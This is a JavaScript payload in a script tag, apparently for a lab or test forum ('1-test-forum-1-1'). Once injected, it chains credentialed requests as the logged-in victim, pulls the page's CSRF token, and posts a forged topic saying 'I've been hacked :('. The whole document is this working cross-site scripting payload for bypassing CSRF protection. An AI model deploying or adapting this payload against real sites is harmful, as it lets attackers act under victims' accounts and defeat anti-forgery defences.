
<script type="text/javascript">
    m();
    function m() {
        var funcNum = 0;
        doRequest = function(url, method, body)
        {
            var http = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
            http.withCredentials = true;
            http.onreadystatechange = function() {
                if (this.readyState == 4) {
                    var response = http.responseText; 
                    var d = document.implementation.createHTMLDocument("");
                    d.documentElement.innerHTML = response;
                    requestDoc = d;
                    funcNum++;
                    try {
                        window['r' + funcNum](requestDoc);
                    } catch (error) {}
                }    
            };
            if(method == "POST")
            {
                http.open('POST', url, true);
                http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                http.setRequestHeader('Content-length', body.length);
                http.setRequestHeader('Connection', 'close');
                http.send(body);
            }
            if (method == "GET") {
                http.open('GET', url, true); 
                http.send();
            }

        }
        r0();
    }
    function r0(requestDoc){
        doRequest('/', 'GET', '');
    }

    function r1(requestDoc){
        doRequest('/forum/1-test-forum-1-1', 'GET', '');
    }

    function r2(requestDoc){
        doRequest('/1-test-forum-1-1/topic/new', 'GET', '');
    }

    function r3(requestDoc){
        doRequest('/1-test-forum-1-1/topic/new', 'POST', 'csrf_token=' + encodeURIComponent(requestDoc.getElementsByName('csrf_token')[0].value) + '&title=I+think&content=I%27ve+been+hacked+%3A%28&button=reply');
    }

    function r4(requestDoc){
        doRequest('/topic/5', 'GET', '');
    }

    function r5(requestDoc){
        doRequest('/static/js/topic.js', 'GET', '');
    }

</script>
